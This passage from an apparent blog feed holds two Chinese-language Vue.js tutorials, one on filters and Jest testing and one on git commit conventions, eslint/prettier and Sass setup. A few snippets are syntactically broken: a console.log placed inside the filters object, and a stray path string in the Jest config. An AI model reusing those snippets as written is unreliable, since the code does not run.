选型组件，里面数据从服务端拿的数据。如果我们把这个 <code>list</code> 数据存储起来，下次再次使用，直接从 <code>store</code> 里面拿，这样我们就不用再去请求数据了。相当于减少了一次请求。</p><h2 id="如何使用过滤器，编写自己的过滤器"><a href="#如何使用过滤器，编写自己的过滤器" class="headerlink" title="如何使用过滤器，编写自己的过滤器"></a>如何使用过滤器，编写自己的过滤器</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>假设我现在有个需求，需要将性别0、1、2，分别转换成男、女、不确定这三个汉字展示。页面中多处地方需要使用。</p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  .user-info    .gender        label(for=&quot;性别&quot;) 性别        span {{gender}}&lt;/template&gt;</code></pre><p>完成这个需求，我们知道有 <strong>4</strong> 种方式：</p><ol><li>使用 computed 方法</li><li>使用 methods 方法</li><li>使用 utils 工具类</li><li>使用 filters</li></ol><p><strong>应该选择哪种方式呢？</strong></p><p>我从下面三个方面来论述这个问题</p><p><strong>1. 可实现性</strong></p><ul><li>使用 <code>computed</code> 实现成功，我们知道 <code>computed</code> 不是一个函数是无法传参的，这里有个技巧， <code>return</code> 一个函数接受传过来的参数</li></ul><pre><code class="js">    // ...      computed: {          convertIdToName() {              return function(value) {                  const item = list.find(function(item) {                        return item.id === value                    })                    return item.name                }            }      }</code></pre><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9eb7a20ecdcdf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="如图所示"></p><ul><li>使用 <code>methods</code> 实现成功，这里直接可以传参数，一种常规的写法。</li></ul><blockquote><p>注意 <code>methods</code>、 <code>computed</code>和 <code>data</code> 相互之前是不能同名的</p></blockquote><pre><code class="js">  // ...    methods: {        convertIdToName(value) {            const item = list.find(function(item) {                return item.id === value            })            return item.name        }    }</code></pre><ul><li>使用 <code>utils</code> 和 <code>methods</code> 差不多基本上也可以实现</li><li>使用 <code>filter</code> 也是实现的，有个可以和 <code>methods</code> 、 <code>computed</code> 同名哦</li></ul><pre><code class="js">    filters: {          console.log(this.render)          convertIdToName(value) {              const item = list.find(function(item) {                  return item.id === value              })              return item.name          }      },</code></pre><p><strong>总的来说他们全部都可以实现这个需求</strong></p><p><strong>2. 局限性</strong></p><ul><li><code>computed</code> 、 <code>methods</code> 和 <code>data</code> 三者互不同名，他们没办法被其他组件使用，除非通过 <code>mixins</code></li><li><code>filters</code> 与 <code>utils</code> 无法访问 <code>this</code> ，也就是于响应式绝缘。但是通过定义全局 <code>filters</code> ，可以其他地方使用，另外还可以直接加载第三方 <code>filter</code> 和 <code>utils</code></li></ul><p><strong>3. 总结比较</strong></p><p><code>filters</code> 与 <code>utils</code> 归属一对，他们既是脱离了 <code>this</code>，获得了自由，又是被 <code>this</code> 弃之门外。相反 <code>methods</code> 与 <code>computed</code> 与 <code>this</code> 紧紧站在一起，但又是无法获得自由。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="编写一个简单的千分位过滤器"><a href="#编写一个简单的千分位过滤器" class="headerlink" title="编写一个简单的千分位过滤器"></a>编写一个简单的千分位过滤器</h4><pre><code class="js">export const thousandBitSeparator = (value) =&gt; {    return   value &amp;&amp; (value.toString().indexOf(&#39;.&#39;) !== -1 ? value.toString().replace(/(\d)(?=(\d{3})+\.)/g, function($0, $1) {          return $1 + &#39;,&#39;;      }) :   value.toString().replace(/(\d)(?=(\d{3})+$)/g, function($0, $1) {          return $1 + &#39;,&#39;;      })  );}</code></pre><h4 id="使用-vue-filter-插件"><a href="#使用-vue-filter-插件" class="headerlink" title="使用 vue-filter 插件"></a>使用 vue-filter 插件</h4><p>两款插件</p><p><a href="https://www.npmjs.com/package/vue-filter" target="_blank" rel="noopener">vue-filter</a> 使用 <code>use</code> 引入</p><p><a href="https://www.npmjs.com/package/vue-filters" target="_blank" rel="noopener">vue2-filters</a> 使用 <code>mixins</code> 引入</p><blockquote><p>有需要的话，我一般就用第二个了，大多数都是自己写一下小过滤器</p></blockquote><p>自定义过滤器之后，直接全局自动注册，其他地方都可以使用</p><h4 id="注册全局过滤器"><a href="#注册全局过滤器" class="headerlink" title="注册全局过滤器"></a>注册全局过滤器</h4><p>遍历过滤属性值，一次性全部注册</p><pre><code class="js">for (const key in filters) {      Vue.filter(key, filters[key])}</code></pre><h2 id="如何使用-Jest-测试你的代码"><a href="#如何使用-Jest-测试你的代码" class="headerlink" title="如何使用 Jest 测试你的代码"></a>如何使用 Jest 测试你的代码</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>我们思考一下测试 js 代码需要哪些东西</p><ol><li>浏览器运行环境</li><li>断言库</li></ol><p>如果是测试 vue 代码呢？ 那得再加一个 vue 测试容器</p><h3 id="Jest-Vue"><a href="#Jest-Vue" class="headerlink" title="Jest + Vue"></a>Jest + Vue</h3><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><pre><code class="json">{      &quot;@vue/cli-plugin-unit-jest&quot;: &quot;^4.0.5&quot;,      &quot;@vue/test-utils&quot;: &quot;1.0.0-beta.29&quot;,      &quot;jest&quot;: &quot;^24.9.0&quot;,      // ...}</code></pre><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><pre><code class="js">// For a detailed explanation regarding each configuration property, visit:// https://jestjs.io/docs/en/configuration.htmlmodule.exports = {    preset: &#39;@vue/cli-plugin-unit-jest&#39;,    automock: false, &quot;/private/var/folders/10/bb2hb93j34999j9cqr587ts80000gn/T/jest_dx&quot;,    clearMocks: true,    // collectCoverageFrom: null,    coverageDirectory: &#39;tests/coverage&#39;    //...}</code></pre><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><h4 id="测试-utils-工具类"><a href="#测试-utils-工具类" class="headerlink" title="测试 utils 工具类"></a>测试 utils 工具类</h4><blockquote><p>对我们之前写的一个性别名称转换工具进行测试</p></blockquote><pre><code class="js">import { convertIdToName } from &#39;./convertIdToName&#39;describe(&#39;测试convertIdToName方法&#39;, () =&gt; {    const list = [        { id: 0, name: &#39;男&#39; },        { id: 1, name: &#39;女&#39; },        { id: 2, name: &#39;未知&#39; }    ]    it(&#39;测试正常输入&#39;, () =&gt; {        const usage = list        usage.forEach((item) =&gt; {            expect(convertIdToName(item.id, list)).toBe(item.name)        })  })    it(&#39;测试非正常输入&#39;, () =&gt; {        const usage = [&#39;a&#39;, null, undefined, NaN]        usage.forEach((item) =&gt; {            expect(convertIdToName(item, list)).toBe(&#39;&#39;)        })    })})</code></pre><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9eda87016bfe2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="如图所示"><br>这样一测试，发现原来我们之前写的工具有这么多漏洞 测试正常输入全部通过了，非正常输入失败了，根据测试用例改进我们的代码</p><pre><code class="js">export const convertIdToName = (value, list) =&gt; {    if (value !== 0 &amp;&amp; value !== 1 &amp;&amp; value !== 2) return &#39;&#39;    const item = list.find(function(item) {        return item.id === value    })   return item.name}</code></pre><p>现在测试都通过了呢</p><h4 id="测试-components-单文件组件"><a href="#测试-components-单文件组件" class="headerlink" title="测试 components 单文件组件"></a>测试 components 单文件组件</h4><blockquote><p>对我们最简单的 <code>hello world</code> 进行测试</p></blockquote><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  .hello    h1 {{ msg }}&lt;/template&gt;&lt;script&gt;export default {    props: {        msg: String    }}&lt;/script&gt;</code></pre><pre><code class="js">import { shallowMount } from &#39;@vue/test-utils&#39;import HelloWorld from &#39;@/components/HelloWorld.vue&#39;describe(&#39;HelloWorld.vue&#39;, () =&gt; {    it(&#39;renders props.msg when passed&#39;, () =&gt; {        const msg = &#39;new message&#39;        const wrapper = shallowMount(HelloWorld, {            propsData: { msg }        })        expect(wrapper.text()).toMatch(msg)    })})</code></pre><h4 id="测试-api-请求"><a href="#测试-api-请求" class="headerlink" title="测试 api 请求"></a>测试 api 请求</h4><p>异步测试有几种常见写法</p><ul><li><code>async</code> 与 <code>await</code></li><li><code>done()</code></li></ul><blockquote><p>简单的异步测试，测试一个简单的登陆请求</p></blockquote><pre><code class="js">export const login = (data) =&gt; post(&#39;/user/login&#39;, data)</code></pre><p>测试代码</p><pre><code class="js">import { login } from &#39;@/api/index&#39;describe(&#39;login api&#39;, () =&gt; {    const response = {        code: &#39;1000&#39;,        data: {}    }    const errorResponse = {        code: &#39;5000&#39;,        data: {},       message: &#39;用户名或密码错误&#39;    }    it(&#39;测试正常登陆&#39;, async () =&gt; {        const params = {            user: &#39;admin&#39;,            password: &#39;123456&#39;        }        expect(await login(params)).toEqual(response)    })    it(&#39;测试异常登陆&#39;, async () =&gt; {        const params = {            user: &#39;admin&#39;,           password: &#39;123123&#39;        }        expect(await login(params)).toEqual(errorResponse)    })})</code></pre><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9efc734a64747?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="如图所示"></p><h3 id="功能模块测试"><a href="#功能模块测试" class="headerlink" title="功能模块测试"></a>功能模块测试</h3><p>组件， <code>api</code>，工具这些零零碎碎都测试了，而且这些都是比较通用、和业务关系不大的代码，它们改动较少，测试到这里其实已经足够了，已经达到了 <code>20%</code> 的测试工作量了很大一部分代码的目的。</p><blockquote><p>为什么我说只有 20% 的工作量呢？因为这些都是不怎么变化的逻辑，是一劳永逸的事情。长远来说占用的工作量确实很少。</p></blockquote><p>但是有些情况业务还是必须得测，也就是必须要功能模块集成测试。</p><p>经常得回归的业务，那种迭代对原有的系统比较大，避免改动之后使旧的代码各种新的问题。这种经常回归测试，采用 <code>BDD</code> + 集成测试，比不停改 <code>bug</code> 要轻松的多。</p><h3 id="快照测试"><a href="#快照测试" class="headerlink" title="快照测试"></a>快照测试</h3><p>像版本一样，每次测试之后生成一个版本，比较与上一个版本的区别。 这是一种粒度及其小的测试，可以测试到每一个符号。</p><h4 id="比如我用它来测试一个配置文件的变动"><a href="#比如我用它来测试一个配置文件的变动" class="headerlink" title="比如我用它来测试一个配置文件的变动"></a>比如我用它来测试一个配置文件的变动</h4><p>这是我们一个配置文件</p><pre><code class="js">export const api = {    develop: &#39;http://xxxx:8080&#39;,    mock: &#39;http://xxxx&#39;,    feature: &#39;http://xxxx&#39;,    test: &#39;http://xxxx&#39;,    production: &#39;http://xxxx&#39;}export default api[process.env.NODE_ENV || &#39;dev&#39;]</code></pre><p>使用快照测试</p><pre><code class="js">import { api } from &#39;./config&#39;describe(&#39;配置文件测试&#39;, () =&gt; {    it(&#39;测试配置文件是否变动&#39;, () =&gt; {        expect(api).toMatchSnapshot({            develop: &#39;http://xxxx:8080&#39;,            mock: &#39;http://xxxx&#39;,             feature: &#39;http://xxxx&#39;,             test: &#39;http://xxxx&#39;,             production: &#39;http://xxxx&#39;          })    })})</code></pre><p>使用快照第一次测试后，通过测试，代码被写入快照<br><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9f1b5e3b2e64f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="快照测试1"><br><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9f1d9415200e8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="快照测试2"><br>改动配置再次测试，未通过测试 这时如果要改变配置怎么办呢？ 只需同时改一下用例就好了。快照将再次写入快照生成版本2，这样配置改动也有根据了<br><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9f1eeb7396fdc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="快照测试3"></p><h3 id="TDD-与-BDD"><a href="#TDD-与-BDD" class="headerlink" title="TDD 与 BDD"></a>TDD 与 BDD</h3><p>最近讨论比较多的算是 <strong>测试驱动开发</strong>和 <strong>行为驱动开发</strong>，其实总得来说是 4 种</p><ol><li>不写测试。好处是省时间，坏处当然就 <code>bug</code> 多，代码质量低。</li><li>先写测试和测试用例，再写代码，也就是测试驱动开发。这样好处是代码比较健全，考虑的因素比较多。固定模块健壮性高，bug少。</li><li>先写代码，再通过模拟用户的行为写测试。好处是思路清晰，如果测试用例够全面，基本上线基本没太大问题，回归测试也很好做。</li><li>写代码之前写测试和用例，写完代码之后再写用户行为测试。这种代码质量就太高了，当然缺点就是费时间。</li></ol><blockquote><p>那么你是哪一种？ 反正我比较佛系哈，有的不写测试，也有的写满测试。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5e15932ee51d4540f02fae27&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;概览&quot;&gt;&lt;a href=&quot;#概览&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>吃透Vue项目开发实践(上)</title>
    <link href="https://zhanghao-web.github.io/2020/05/06/Vue/%E5%90%83%E9%80%8FVue%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5-%E4%B8%8A/"/>
    <id>https://zhanghao-web.github.io/2020/05/06/Vue/吃透Vue项目开发实践-上/</id>
    <published>2020-05-06T09:37:11.000Z</published>
    <updated>2020-05-09T02:09:20.169Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5e0202fc6fb9a0165721e39a" target="_blank" rel="noopener">原文地址</a></p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p><img src="https://user-gold-cdn.xitu.io/2019/12/30/16f5676f7940d72a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="概览"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>我将从 16 个方面来论述 vue 开发过程中的一些技巧和原理。当然由于篇幅有限，先论述前 8 个问题，下节将完成全系列内容。</p></blockquote><p>本篇文章将围绕下列问题进行论述：</p><ul><li><strong>如何规范你的 git 提交，并自动生成并提交日志？</strong></li><li><strong>如何配置和使用 Sass 和 PUG 提升你的编码效率？</strong></li><li><strong>如何处理你的代码风格问题，以及如何使用 perttier 与 eslint 解决效率风格两难问题？</strong></li><li><strong>如何管理页面的路由，如何编写异步路由？</strong></li><li><strong>如何编写组件，引入组件库？</strong></li><li><strong>如何管理你的资源，如何引入图标，样式？</strong></li><li><strong>如何封装你的 axios，管理你的api？</strong></li><li><strong>如何使用 mock 模拟你的数据，实现真正意义的前后端分离？</strong></li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><blockquote><p>实践之前：我希望你有如下准备，或者知识储备。</p><ul><li>了解 <code>npm/yarn/git/sass/pug/vue/vuex/vue-router/axios/mock/ssr/jest</code><br>的使用和原理。</li><li>当然上面知识不了解也没关系哈哈哈，文章中会提到大致用法和作用。</li></ul></blockquote><h3 id="如何规范-git-提交"><a href="#如何规范-git-提交" class="headerlink" title="如何规范 git 提交"></a>如何规范 git 提交</h3><blockquote><p>代码提交记录是一个很好的代码修改日志。规范的代码提交记录，不管在平时代码开发维护过程中，还是在定位 bug 或者回退版本来说都是极为重要。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>两种做法：</p><ul><li>自己手动规范 git 的提交原则或者团队统一制定。这个靠自觉，好习惯养成之后就没问题来</li><li>使用插件规范，比如下面这种</li></ul><p>为了规范提交，我使用了如下插件：</p><ul><li>commitizen</li><li>conventional-changelog</li><li>cz-conventional-changelog</li><li>conventional-changelog-cli<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><h5 id="安装系列插件依赖"><a href="#安装系列插件依赖" class="headerlink" title="安装系列插件依赖"></a>安装系列插件依赖</h5><pre><code class="sh">yarn add -D commitizen conventional-changelog cz-conventional-changelog</code></pre><blockquote><p>安装依赖时，要注意是否是生产环境需要的。显然 <code>commitizen</code> 只在开发环境中使用。<code>-D</code> 只在 <code>dev</code> 环境使用</p></blockquote><h5 id="配置依赖路径"><a href="#配置依赖路径" class="headerlink" title="配置依赖路径"></a>配置依赖路径</h5>在 <code>package.json</code> 中添加配置<pre><code class="js">{  //...  &quot;config&quot;: {      &quot;commitizen&quot;: {        &quot;path&quot;: &quot;./node_modules/cz-conventional-changelog&quot;      }  }}</code></pre>在命令行中输入<pre><code class="sh">git add -Agit-cz</code></pre>出现了交互输入方式，规范你的 <code>commit</code> 输入格式<br><img src="https://user-gold-cdn.xitu.io/2019/12/30/16f554235055e8f3?w=2194&amp;h=620&amp;f=jpeg&amp;s=226477" alt="commit"></li></ul><h5 id="生成-CHANGELOG"><a href="#生成-CHANGELOG" class="headerlink" title="生成 CHANGELOG"></a>生成 CHANGELOG</h5><pre><code class="sh">npm i -g conventional-changelog-cli</code></pre><p>增加一个npm 命令，快速生成日志</p><pre><code class="js">&quot;genlog&quot;: &quot;conventional-changelog -p angular -i .github/CHANGELOG.md -s&quot;</code></pre><p>使用<code>yarn</code>命令生成日志</p><pre><code class="sh">yarn genlog</code></pre><p>自动生成的log</p><h5 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h5><ul><li><strong>git:</strong> 增加commitizen工具规范提交 (<a href="https://github.com/suoyuesmile/suo-design-pro/commit/58e39370aa838fd99312f73b37d092ffadc85990" target="_blank" rel="noopener">58e3937</a>)</li></ul><h3 id="如何管理代码风格"><a href="#如何管理代码风格" class="headerlink" title="如何管理代码风格"></a>如何管理代码风格</h3><blockquote><p>较统一的代码风格利于阅读，也利于协作。</p></blockquote><h4 id="原理与解决方案"><a href="#原理与解决方案" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>使用 eslint 约束基本风格和语法，使用 prettier 自动格式化你的代码。</p><h4 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h4><h5 id="安装-eslint-依赖"><a href="#安装-eslint-依赖" class="headerlink" title="安装 eslint 依赖"></a>安装 eslint 依赖</h5><pre><code class="json">{    &quot;eslint&quot;: &quot;^5.16.0&quot;,    &quot;eslint-config-standard&quot;: &quot;^6.2.1&quot;,    &quot;eslint-friendly-formatter&quot;: &quot;^2.0.7&quot;,    &quot;eslint-loader&quot;: &quot;^2.1.2&quot;,    &quot;eslint-plugin-html&quot;: &quot;^2.0.1&quot;,    &quot;eslint-plugin-promise&quot;: &quot;^3.5.0&quot;,    &quot;eslint-plugin-standard&quot;: &quot;^2.3.1&quot;,    &quot;eslint-plugin-vue&quot;: &quot;^5.0.0&quot;}</code></pre><p>使用两个插件，一个 <code>plugin:vue/essential</code>，一个是 <code>standard</code>。<br><code>vue/essential</code> 为了在 vue 里面也可以生效。另一个是 <code>standard</code>。<br><a href="https://github.com/standard/standard/blob/master/docs/RULES-zhcn.md#javascript-standard-style" target="_blank" rel="noopener">standard 标准文档</a></p><blockquote><p>使用 recommend 也可以，采用推荐 lint，更加轻量化</p></blockquote><pre><code class="js">module.exports = {  root: true,  env: {    node: true  },  extends: [&#39;plugin:vue/essential&#39;, &#39;standard&#39;],  rules: {    quotes: [&#39;error&#39;, &#39;single&#39;],    indent: [&#39;error&#39;, 2, { MemberExpression: &#39;off&#39; }],    &#39;arrow-parens&#39;: 0,    &#39;no-loop-func&#39;: 2,    &#39;space-before-function-paren&#39;: [&#39;error&#39;, &#39;never&#39;],    indent: [&#39;error&#39;, 2, { SwitchCase: 1 }]  },  parserOptions: {    parser: require.resolve(&#39;babel-eslint&#39;),    ecmaVersion: 2018,    sourceType: &#39;module&#39;  }}</code></pre><h5 id="可以自定义-rules-的规则"><a href="#可以自定义-rules-的规则" class="headerlink" title="可以自定义 rules 的规则"></a>可以自定义 rules 的规则</h5><blockquote><p>rules 的规则 { 规则名：[是否关闭/规则等级，配置的值，只对部分配置] }<br><code>indent: [&#39;error&#39;, 2, { SwitchCase: 1 }]</code> 兼容 prettier，prettier 会将代码格式化成 eslint 报错的情况。<br>规则等级：0 关闭 1 警告 2 报错</p></blockquote><h5 id="使用-prettier"><a href="#使用-prettier" class="headerlink" title="使用 prettier"></a>使用 prettier</h5><h6 id="配置-prettier-文件"><a href="#配置-prettier-文件" class="headerlink" title="配置 prettier 文件"></a>配置 prettier 文件</h6><pre><code class="js">{  &quot;printWidth&quot;: 150,  &quot;singleQuote&quot;: true,  &quot;trailingComma&quot;: &quot;none&quot;,  &quot;semi&quot;: false,  &quot;tabWidth&quot;: 2,  &quot;useTabs&quot;: false,  &quot;bracketSpacing&quot;: true,  &quot;jsxBracketSameLine&quot;: false,  &quot;arrowParens&quot;: &quot;always&quot;,  &quot;proseWrap&quot;: &quot;preserve&quot;,  &quot;overrides&quot;: [    {        &quot;files&quot;: [&quot;*.json&quot;, &quot;.eslintrc&quot;, &quot;.tslintrc&quot;, &quot;.prettierrc&quot;, &quot;.tern-project&quot;],        &quot;options&quot;: {            &quot;parser&quot;: &quot;json&quot;,            &quot;tabWidth&quot;: 2        }    },    {        &quot;files&quot;: &quot;*.{css,sass,scss,less}&quot;,        &quot;options&quot;: {            &quot;parser&quot;: &quot;css&quot;,            &quot;tabWidth&quot;: 2        }    },    {        &quot;files&quot;: &quot;*.ts&quot;,        &quot;options&quot;: {            &quot;parser&quot;: &quot;typescript&quot;        }    },    {        &quot;files&quot;: &quot;*.vue&quot;,        &quot;options&quot;: {            &quot;parser&quot;: &quot;vue&quot;        }    },    {        &quot;files&quot;: &quot;*.md&quot;,        &quot;options&quot;: {            &quot;parser&quot;: &quot;markdown&quot;        }    }  ]}</code></pre><h5 id="开启-vscode-自动格式化"><a href="#开启-vscode-自动格式化" class="headerlink" title="开启 vscode 自动格式化"></a>开启 vscode 自动格式化</h5><pre><code class="json">{  // prettier  &quot;prettier.singleQuote&quot;: true,  &quot;prettier.semi&quot;: false,  &quot;prettier.tabWidth&quot;: 2,  &quot;[javascript]&quot;: {    &quot;editor.formatOnSave&quot;: true,    &quot;editor.defaultFormatter&quot;: &quot;esbenp.prettier-vscode&quot;  }}</code></pre><h3 id="如何提升编码效率"><a href="#如何提升编码效率" class="headerlink" title="如何提升编码效率"></a>如何提升编码效率</h3><h4 id="原理与解决方案-1"><a href="#原理与解决方案-1" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h4><p>我主要从 3 个方面来做一些编码效率上的改进</p><ul><li>升级你的 vue-cli 减少 webpack 配置的成本</li><li>使用 sass，利用里面函数、mixins、变量提升 css 文件的复用</li><li>使用 pug，减少 html 的代码编写量</li></ul><h4 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h4><blockquote><p><code>vue-cli3+、vue-cli4+</code> 相比于 <code>vue-cli2+</code> 最大的改变就是将约定俗称的配置，全部公共化了，也就是做了一次二次封装。这样的好处在于，我们不必要在繁多的配置代码中寻找需要的配置。</p></blockquote><p>简单新建一个配置入口就能操作我们大多数想要的功能。在 <code>root</code> 目录下新建一个 <code>vue.config.js</code> 文件，作为我们 <code>webpack</code> 的配置文件。</p><p><strong>初始化 vue 配置</strong></p><pre><code class="js">const autoprefixer = require(&#39;autoprefixer&#39;)module.exports = {  publicPath: process.env === &#39;production&#39; ? &#39;&#39; : &#39;/&#39;,  outputDir: &#39;dist&#39;,  assetsDir: &#39;static&#39;,  filenameHashing: true,  lintOnSave: true,  runtimeCompiler: false,  transpileDependencies: [/\/node_modules\/vue-echarts\//, /\/node_modules\/resize-detector\//],  productionSourceMap: false}</code></pre><p>简单的配置完成后，我们引入一个 <code>sass</code> 工具用于编写 <code>sass</code>文件</p><blockquote><p>用法见 sass <a href="https://www.sass.hk/docs/" target="_blank" rel="noopener">参考资料</a>！</p></blockquote><h5 id="使用-Sass"><a href="#使用-Sass" class="headerlink" title="使用 Sass"></a>使用 Sass</h5><h6 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h6><pre><code class="sh">yarn add -D sass sass-loader</code></pre><h6 id="如何处理样式"><a href="#如何处理样式" class="headerlink" title="如何处理样式"></a>如何处理样式</h6><p>在 <code>assets</code> 目录中建立一个 styles 文件专门来存放样式文件，新增入口<code>index.scss</code>文件，便于 JavaScript 引入，增加 utils.scss、reset.scss、varibles 文件。</p><blockquote><p>这些样式工具都是为了提升我们 <code>scss</code> 开发效率，具有畅快的开发体验！</p></blockquote><h6 id="使用-varibles-变量文件"><a href="#使用-varibles-变量文件" class="headerlink" title="使用 varibles 变量文件"></a>使用 varibles 变量文件</h6><p>为了提升我们代码的可读性，复用性。使用 <code>sass</code> 变量必不可少。</p><p>还有一点就是利于全局修改样式，如果需要更换皮肤这个功能，我们只需要更改全局的主题色，即可更换主题，那样更加方便。</p><pre><code class="scss">// 主题色$color-red: #ff3333;$color-purple: #ff33a9;$color-orange: #ff8833;$color-blue: #3377ff;// 文字色$color-black: #000;$color-dark: #333;$color-deep: #555;$color-pl: #999999;$color-weak: #B3B3B3;$color-white: #fff;// 背景色$bg-bar: #F9F9F9;$bg-page: #F3F3F3;$bg-page-light: #F9F9F9;</code></pre><p>使用变量之后，sass 文件不会直接生效，至少在 vue 文件 里面是访问不到的。<br>需要在 <code>vue.config.js</code> 里面增加如下配置。</p><pre><code class="js">module.exports = {    // ...    css: {        sourceMap: true,        loaderOptions: {            sass: {                prependData: `        @import &quot;@/assets/styles/variable.scss&quot;;        `            }        }    }}</code></pre><h6 id="覆盖默认样式"><a href="#覆盖默认样式" class="headerlink" title="覆盖默认样式"></a>覆盖默认样式</h6><p>常规操作, 引入 reset.scss 将默认样式覆盖掉</p><pre><code class="scss">/* http://meyerweb.com/eric/tools/css/reset/   v2.0 | 20110126   License: none (public domain)*/html, body, div, span, applet, object, iframe,h1, h2, h3, h4, h5, h6, p, blockquote, pre,a, abbr, acronym, address, big, cite, code,del, dfn, em, img, ins, kbd, q, s, samp,small, strike, strong, sub, sup, tt, var,b, u, i, center,dl, dt, dd, ol, ul, li,fieldset, form, label, legend,table, caption, tbody, tfoot, thead, tr, th, td,article, aside, canvas, details, embed,figure, figcaption, footer, header, hgroup,menu, nav, output, ruby, section, summary,time, mark, audio, video {    margin: 0;    padding: 0;    border: 0;    font-size: 100%;    font: inherit;    vertical-align: baseline;}/* HTML5 display-role reset for older browsers */article, aside, details, figcaption, figure,footer, header, hgroup, menu, nav, section {    display: block;}body {    line-height: 1;}ol, ul {    list-style: none;}blockquote, q {    quotes: none;}blockquote:before, blockquote:after,q:before, q:after {    content: &#39;&#39;;    content: none;}table {    border-collapse: collapse;    border-spacing: 0;}html, body {  width: 100%;  height: 100%;  overflow: auto;  margin: 0;  scroll-behavior: smooth;  -webkit-overflow-scrolling: touch;}</code></pre><h6 id="使用样式工具集"><a href="#使用样式工具集" class="headerlink" title="使用样式工具集"></a>使用样式工具集</h6><p>有时候我们发现，光是引入变量还不够，变量工具只能允许我们在 css 类文件中使用。假如我想着模版中直接使用样式，有没有更快的方案呢？<br>当然有的，我们可以自定义一个常用的样式工具集。设置一些背景颜色、字体颜色、盒子模型中的常规操作。</p><blockquote><p>要是有设计规范更好哦，我也是常常向设计师提出要求，一定要制定出一套产品的设计规范。</p></blockquote><pre><code class="scss">/* // utils 工具// 颜色 */.bg-red {background-color: $color-red!important;}.bg-purple {background-color: $color-purple!important;}.bg-orange {background-color: $color-orange!important;}.bg-blue {background-color: $color-blue!important;}.color-red {color: $color-red!important;}.color-purple {color: $color-purple!important;}.color-orange {color: $color-orange!important;}.color-blue {color: $color-blue!important;}.text-black {color: #000;}.text-dark {color: #333;}.text-deep {color: #555;}.text-weak {color: #B3B3B3;}.text-white {color: #fff;}/* // 字体 */.f10 {font-size: 10px;}.f12 {font-size: 12px;}.f14 {font-size: 14px;}.f15 {font-size: 15px;}.f17 {font-size: 17px;}.f20 {font-size: 20px;}.f24 {font-size: 24px;}/* // 文字对齐 */.tl {text-align: left;}.tc {text-align: center;}.tr {text-align: right;}/* // 浮动与清除浮动 */.fl {float: left;}.fr {float: right;}.fix {*zoom: 1;}.fix:after{display:table; content:&#39;&#39;; clear:both;}/* // 显示 */.dn{display:none;}.di{display:inline;}.db{display:block;}.dib{display:inline-block;}.dt{display:table;}div.dib{*display:inline; *zoom:1;}.vm {vertical-align: middle;}.vib {display:inline-block; vertical-align: middle;}/* // 定位 */.pr {position: relative;}.pa {position: absolute;}.pf {position: fixed;}/* // 盒子模型 */.ml4 {margin-left: 4px;}.mr4 {margin-right: 4px;}.mt4 {margin-top: 4px;}.mb4 {margin-bottom: 4px;}.ml8 {margin-left: 8px;}.mr8 {margin-right: 8px;}.mt8 {margin-top: 8px;}.mb8 {margin-bottom: 8px;}.ml12 {margin-left: 12px;}.mr12 {margin-right: 12px;}.mt12 {margin-top: 12px;}.mb12 {margin-bottom: 12px;}.ml16 {margin-left: 16px;}.mr16 {margin-right: 16px;}.mt16 {margin-top: 16px;}.mb16 {margin-bottom: 16px;}.ml20 {margin-left: 20px;}.mr20 {margin-right: 20px;}.mt20 {margin-top: 20px;}.mb20 {margin-bottom: 20px;}.ml24 {margin-left: 24px;}.mr24 {margin-right: 24px;}.mt24 {margin-top: 24px;}.mb24 {margin-bottom: 24px;}.ml10 {margin-left: 10px;}.mr10 {margin-right: 10px;}.mt10 {margin-top: 10px;}.mb10 {margin-bottom: 10px;}.ml15 {margin-left: 15px;}.mr15 {margin-right: 15px;}.mt15 {margin-top: 15px;}.mb15 {margin-bottom: 15px;}/* // 按钮禁用 */.disabled{outline:0 none; cursor:default!important; opacity:.4; filter:alpha(opacity=40); -ms-pointer-events:none; pointer-events:none;}</code></pre><h6 id="增加样式入口文件"><a href="#增加样式入口文件" class="headerlink" 